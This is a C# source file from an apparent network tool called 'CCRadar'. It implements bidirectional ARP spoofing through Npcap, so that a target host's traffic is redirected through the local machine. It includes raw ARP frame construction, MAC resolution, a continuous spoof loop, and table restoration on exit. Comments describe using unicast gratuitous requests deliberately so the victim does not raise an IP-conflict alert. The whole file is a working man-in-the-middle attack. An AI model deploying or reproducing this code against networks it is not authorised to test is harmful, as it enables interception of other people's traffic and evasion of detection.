using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;

namespace CCRadar.Core.Infrastructure;

// LAN 模式流量改道：B 机双向 ARP 欺骗（对 A 冒充网关、对网关冒充 A），
// 使 A 的收发流量都经过 B；停止时恢复真实 ARP。WinDivert 只处理 IP 层，
// 发送原始 ARP 帧必须依赖 Npcap（wpcap.dll，显式按完整路径加载）。
internal sealed class ArpSpoofService : IAsyncDisposable
{
    private readonly NetworkInterface _adapter;
    private readonly PhysicalAddress _localMac;
    private readonly IPAddress _localIp, _gatewayIp, _targetIp;
    private readonly Action<string, object> _emit;
    private readonly CancellationTokenSource _stop = new();
    private IntPtr _handle;
    private Task? _loop;
    private PhysicalAddress? _gatewayMac, _targetMac;
    private long _spoofFrames, _restoreFrames;
    private bool _disposed;

    public long SpoofFrames => Interlocked.Read(ref _spoofFrames);
    public long RestoreFrames => Interlocked.Read(ref _restoreFrames);
    public bool Running { get; private set; }
    public PhysicalAddress? TargetMac => _targetMac;
    public PhysicalAddress? GatewayMac => _gatewayMac;

    public ArpSpoofService(NetworkInterface adapter, IPAddress localIp, IPAddress gatewayIp, IPAddress targetIp, Action<string, object> emit)
    {
        _adapter = adapter;
        _localMac = adapter.GetPhysicalAddress();
        _localIp = localIp;
        _gatewayIp = gatewayIp;
        _targetIp = targetIp;
        _emit = emit;
        if (_localMac.GetAddressBytes().Length != 6) throw new IOException($"网卡 {adapter.Name} 未提供有效的 MAC 地址。");
    }

    public static bool IsNpcapAvailable(out string libraryPath, out string error)
    {
        libraryPath = string.Empty;
        return NpcapNative.TryLoad(out libraryPath, out error);
    }

    // pcap_findalldevs 的设备名与 NetworkInterface.Id 的 GUID 交叉匹配；
    // 拼接名（\\.\NPF_{GUID}）仅作回退，逐一尝试到打开成功为止。
    private IntPtr OpenAdapter(out string deviceName)
    {
        var devices = NpcapNative.ListDevices(out var listError);
        if (devices.Count == 0 && !string.IsNullOrEmpty(listError))
        {
            _emit("npcap_device_list_failed", new { error = listError });
        }
        var guid = _adapter.Id.Trim('{', '}');
        var matched = devices.FirstOrDefault(d => d.Name.IndexOf(guid, StringComparison.OrdinalIgnoreCase) >= 0);
        var candidates = new List<string>();
        if (matched is not null) candidates.Add(matched.Name);
        candidates.Add(@"\\.\NPF_" + _adapter.Id);
        candidates.Add(@"\Device\NPF_" + _adapter.Id);
        string? lastError = null;
        foreach (var candidate in candidates.Distinct())
        {
            var handle = NpcapNative.OpenLive(candidate, 256, promisc: 0, toMs: 200, out var openError);
            if (handle != IntPtr.Zero)
            {
                deviceName = candidate;
                _emit("npcap_adapter_opened", new
                {
                    device = candidate,
                    matchedFromList = matched is not null,
                    deviceCount = devices.Count,
                    description = matched?.Description
                });
                return handle;
            }
            lastError = openError;
        }
        deviceName = string.Empty;
        var listDump = string.Join(" | ", devices.Select(d => d.Name).Take(16));
        throw new IOException(
            $"打开 Npcap 网卡失败（适配器 {_adapter.Name}，GUID {_adapter.Id}）。" +
            $"Npcap 设备列表 {devices.Count} 个{(devices.Count > 0 ? $"：{listDump}" : listError)}；" +
            $"最后错误：{lastError?.Trim()}。请运行 --check-lan-prerequisites 查看详细诊断。");
    }

    public async Task StartAsync()
    {
        if (!NpcapNative.TryLoad(out var libraryPath, out var loadError))
        {
            throw new IOException(loadError + " 局域网模式需要 Npcap 才能发送 ARP 帧。");
        }
        _emit("npcap_loaded", new { library = libraryPath, adapter = _adapter.Id });
        _handle = OpenAdapter(out var deviceName);
        try
        {
            _gatewayMac = ResolveMac(_gatewayIp, _stop.Token);
            _targetMac = ResolveMac(_targetIp, _stop.Token);
            Running = true;
            _loop = Task.Factory.StartNew(() => SpoofLoop(_stop.Token),
                CancellationToken.None, TaskCreationOptions.LongRunning, TaskScheduler.Default);
            _emit("arp_spoof_started", new
            {
                device = deviceName,
                target = _targetIp.ToString(), gateway = _gatewayIp.ToString(),
                targetMac = FormatMac(_targetMac), gatewayMac = FormatMac(_gatewayMac),
                localMac = FormatMac(_localMac)
            });
        }
        catch
        {
            NpcapNative.Close(_handle);
            _handle = IntPtr.Zero;
            throw;
        }
        await Task.CompletedTask;
    }

    public async ValueTask DisposeAsync()
    {
        if (_disposed) return;
        _disposed = true;
        try { await _stop.CancelAsync(); } catch { }
        try { if (_loop is not null) await _loop.WaitAsync(TimeSpan.FromSeconds(5)); }
        catch { }
        try { if (Running) await RestoreAsync(); } catch { }
        Running = false;
        if (_handle != IntPtr.Zero)
        {
            NpcapNative.Close(_handle);
            _handle = IntPtr.Zero;
        }
        _stop.Dispose();
    }

    // 广播 who-has target，抓取 reply 得到真实 MAC（用于退出恢复）。
    private PhysicalAddress ResolveMac(IPAddress target, CancellationToken token)
    {
        var request = ArpFrames.Request(_localMac, _localIp, target);
        var deadline = Environment.TickCount64 + 4000;
        var buffer = new byte[256];
        var lastSend = 0L;
        while (Environment.TickCount64 < deadline && !token.IsCancellationRequested)
        {
            if (Environment.TickCount64 - lastSend >= 500)
            {
                NpcapNative.SendPacket(_handle, request);
                lastSend = Environment.TickCount64;
            }
            var status = NpcapNative.NextEx(_handle, out var headerPtr, out var dataPtr);
            if (status == 1)
            {
                // pcap_pkthdr（x64）：timeval 8 字节 + caplen 4 字节 + len 4 字节。
                var caplen = Marshal.ReadInt32(headerPtr, 8);
                if (caplen >= 42 && caplen <= buffer.Length)
                {
                    Marshal.Copy(dataPtr, buffer, 0, caplen);
                    if (ArpFrames.TryParseReply(buffer.AsSpan(0, caplen), target, out var mac, _localMac))
                    {
                        return mac;
                    }
                }
            }
            else if (status < 0)
            {
                break;
            }
        }
        throw new TimeoutException($"无法解析 {target} 的 MAC 地址；请确认该设备在线并与本机产生过网络流量。");
    }

    private void SpoofLoop(CancellationToken token)
    {
        // 单播伪造应答（标准欺骗）+ 免费ARP 请求（gratuitous request，利用网关/终端的
        // ARP gleaning 学习）：很多网关不接受未经请求的单播应答刷新表项，但会把收到
        // 的请求帧 sender 字段（IP→MAC）直接学进 ARP 表。
        var spoofToTarget = ArpFrames.Reply(_localMac, _gatewayIp, _targetMac!, _targetIp);
        var spoofToGateway = ArpFrames.Reply(_localMac, _targetIp, _gatewayMac!, _gatewayIp);
        // 单播 gratuitous request：只让目标方收到，避免广播引发 A 机的 IP 冲突告警。
        var gratuitousToTarget = ArpFrames.Request(_localMac, _gatewayIp, _gatewayIp, _targetMac);
        var gratuitousToGateway = ArpFrames.Request(_localMac, _targetIp, _targetIp, _gatewayMac);
        while (!token.IsCancellationRequested)
        {
            try
            {
                NpcapNative.SendPacket(_handle, spoofToTarget);
                NpcapNative.SendPacket(_handle, spoofToGateway);
                NpcapNative.SendPacket(_handle, gratuitousToTarget);
                NpcapNative.SendPacket(_handle, gratuitousToGateway);
                Interlocked.Add(ref _spoofFrames, 4);
            }
            catch
            {
                break;
            }
            try { token.WaitHandle.WaitOne(1000); }
            catch { break; }
        }
    }

    // 用解析到的真实 MAC 还原 A 与网关的 ARP 表，各发多遍抗丢帧。
    private async Task RestoreAsync()
    {
        if (_gatewayMac is null || _targetMac is null) return;
        var restoreToTarget = ArpFrames.Reply(_gatewayMac, _gatewayIp, _targetMac, _targetIp);
        var restoreToGateway = ArpFrames.Reply(_targetMac, _targetIp, _gatewayMac, _gatewayIp);
        for (var round = 0; round < 6; round++)
        {
            try
            {
                NpcapNative.SendPacket(_handle, restoreToTarget);
                NpcapNative.SendPacket(_handle, restoreToGateway);
                Interlocked.Add(ref _restoreFrames, 2);
            }
            catch { break; }
            await Task.Delay(150);
        }
        _emit("arp_spoof_restored", new
        {
            target = _targetIp.ToString(), gateway = _gatewayIp.ToString(),
            restoredFrames = Interlocked.Read(ref _restoreFrames)
        });
    }

    private static string FormatMac(PhysicalAddress mac) => string.Join("-", mac.GetAddressBytes().Select(b => b.ToString("X2")));
}

// wpcap.dll 的最小 P/Invoke 封装：按候选路径显式加载，避免 DLL 搜索路径问题。
internal static class NpcapNative
{
    private static IntPtr _library;
    private static ArpSpoofOpenLive _openLive = null!;
    private static ArpSpoofSendPacket _sendPacket = null!;
    private static ArpSpoofNextEx _nextEx = null!;
    private static ArpSpoofClose _close = null!;
    private static ArpSpoofFindAllDevs _findAllDevs = null!;
    private static ArpSpoofFreeAllDevs _freeAllDevs = null!;
    private static readonly object Gate = new();

    public static bool Loaded { get; private set; }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern IntPtr LoadLibrary(string path);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    private static extern IntPtr GetProcAddress(IntPtr module, string name);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet = CharSet.Ansi)]
    private delegate IntPtr ArpSpoofOpenLive(string device, int snaplen, int promisc, int toMs, StringBuilder error);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate int ArpSpoofSendPacket(IntPtr handle, byte[] data, int length);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate int ArpSpoofNextEx(IntPtr handle, out IntPtr header, out IntPtr data);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate void ArpSpoofClose(IntPtr handle);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet = CharSet.Ansi)]
    private delegate int ArpSpoofFindAllDevs(out IntPtr alldevs, StringBuilder error);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate void ArpSpoofFreeAllDevs(IntPtr alldevs);

    public static bool TryLoad(out string libraryPath, out string error)
    {
        lock (Gate)
        {
            if (Loaded)
            {
                error = string.Empty;
                libraryPath = string.Empty;
                return true;
            }
            var candidates = new[]
            {
                Path.Combine(Environment.SystemDirectory, "Npcap", "wpcap.dll"),
                Path.Combine(Environment.SystemDirectory, "wpcap.dll")
            };
            var path = candidates.FirstOrDefault(File.Exists);
            if (path is null)
            {
                libraryPath = string.Empty;
                error = "未找到 Npcap（wpcap.dll）";
                return false;
            }
            _library = LoadLibrary(path);
            if (_library == IntPtr.Zero)
            {
                libraryPath = path;
                error = $"加载失败（错误 {Marshal.GetLastWin32Error()}）";
                return false;
            }
            _openLive = GetFunction<ArpSpoofOpenLive>("pcap_open_live");
            _sendPacket = GetFunction<ArpSpoofSendPacket>("pcap_sendpacket");
            _nextEx = GetFunction<ArpSpoofNextEx>("pcap_next_ex");
            _close = GetFunction<ArpSpoofClose>("pcap_close");
            _findAllDevs = GetFunction<ArpSpoofFindAllDevs>("pcap_findalldevs");
            _freeAllDevs = GetFunction<ArpSpoofFreeAllDevs>("pcap_freealldevs");
            Loaded = true;
            libraryPath = path;
            error = string.Empty;
            return true;
        }
    }

    private static T GetFunction<T>(string name) where T : Delegate
    {
        var address = GetProcAddress(_library, name);
        if (address == IntPtr.Zero)
        {
            throw new IOException($"wpcap.dll 缺少导出函数 {name}，Npcap 安装可能不完整。");
        }
        return Marshal.GetDelegateForFunctionPointer<T>(address);
    }

    public sealed record PcapDevice(string Name, string? Description);

    // 枚举 Npcap 真实设备名（\Device\NPF_{GUID} 等），供打开网卡时按 GUID 匹配原样使用。
    public static List<PcapDevice> ListDevices(out string error)
    {
        var devices = new List<PcapDevice>();
        var buffer = new StringBuilder(512);
        if (_findAllDevs(out var head, buffer) != 0)
        {
            error = buffer.ToString();
            return devices;
        }
        error = string.Empty;
        try
        {
            var current = head;
            while (current != IntPtr.Zero)
            {
                // x64 pcap_if_t：next +0，name +8，description +16，addresses +24，flags +32。
                var name = Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(current, 8));
                var description = Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(current, 16));
                if (!string.IsNullOrEmpty(name)) devices.Add(new(name, string.IsNullOrEmpty(description) ? null : description));
                current = Marshal.ReadIntPtr(current, 0);
            }
        }
        finally
        {
            _freeAllDevs(head);
        }
        return devices;
    }

    public static IntPtr OpenLive(string device, int snaplen, int promisc, int toMs, out string error)
    {
        var buffer = new StringBuilder(512);
        var handle = _openLive(device, snaplen, promisc, toMs, buffer);
        error = buffer.ToString();
        return handle;
    }

    public static void SendPacket(IntPtr handle, byte[] frame)
    {
        if (_sendPacket(handle, frame, frame.Length) != 0)
        {
            throw new IOException($"ARP 帧发送失败（pcap 错误 {Marshal.GetLastWin32Error()}）。");
        }
    }

    // 返回 1=收到帧（header/data 有效），0=超时，<0=错误。
    public static int NextEx(IntPtr handle, out IntPtr header, out IntPtr data) => _nextEx(handle, out header, out data);

    public static void Close(IntPtr handle) => _close(handle);
}

// 42 字节以太 ARP 帧的构造与解析。
internal static class ArpFrames
{
    private static readonly PhysicalAddress Broadcast = new([0xff, 0xff, 0xff, 0xff, 0xff, 0xff]);

    public static byte[] Reply(PhysicalAddress senderMac, IPAddress senderIp, PhysicalAddress targetMac, IPAddress targetIp)
    {
        var frame = new byte[42];
        targetMac.GetAddressBytes().CopyTo(frame, 0);
        senderMac.GetAddressBytes().CopyTo(frame, 6);
        frame[12] = 0x08; frame[13] = 0x06;
        WriteUInt16BigEndian(frame.AsSpan(14), 1);       // htype = Ethernet
        WriteUInt16BigEndian(frame.AsSpan(16), 0x0800);  // ptype = IPv4
        frame[18] = 6; frame[19] = 4;
        WriteUInt16BigEndian(frame.AsSpan(20), 2);       // op = reply
        senderMac.GetAddressBytes().CopyTo(frame, 22);
        senderIp.GetAddressBytes().CopyTo(frame, 28);
        targetMac.GetAddressBytes().CopyTo(frame, 32);
        targetIp.GetAddressBytes().CopyTo(frame, 38);
        return frame;
    }

    public static byte[] Request(PhysicalAddress senderMac, IPAddress senderIp, IPAddress targetIp, PhysicalAddress? targetMac = null)
    {
        // targetMac 为空 = 广播请求（正常解析用）；指定 MAC = 单播 gratuitous 请求，
        // 仅目标方收到，用于欺骗且不惊动第三方（避免对方看到自身 IP 被冒用而告警）。
        var destination = targetMac ?? Broadcast;
        var frame = Reply(senderMac, senderIp, destination, targetIp);
        WriteUInt16BigEndian(frame.AsSpan(20), 1);       // op = request
        destination.GetAddressBytes().CopyTo(frame, 0);
        Array.Clear(frame, 32, 6);
        return frame;
    }

    public static bool TryParseReply(ReadOnlySpan<byte> frame, IPAddress senderIp, out PhysicalAddress senderMac, PhysicalAddress? excludeMac = null)
    {
        senderMac = PhysicalAddress.None;
        if (frame.Length < 42 || frame[12] != 0x08 || frame[13] != 0x06) return false;
        if (frame[20] != 0 || frame[21] != 2) return false; // op = reply
        if (!frame.Slice(28, 4).SequenceEqual(senderIp.GetAddressBytes())) return false;
        var mac = new PhysicalAddress(frame.Slice(22, 6).ToArray());
        if (excludeMac is { } excluded && mac.Equals(excluded)) return false;
        senderMac = mac;
        return true;
    }

    private static void WriteUInt16BigEndian(Span<byte> target, ushort value)
    {
        target[0] = (byte)(value >> 8);
        target[1] = (byte)value;
    }
}
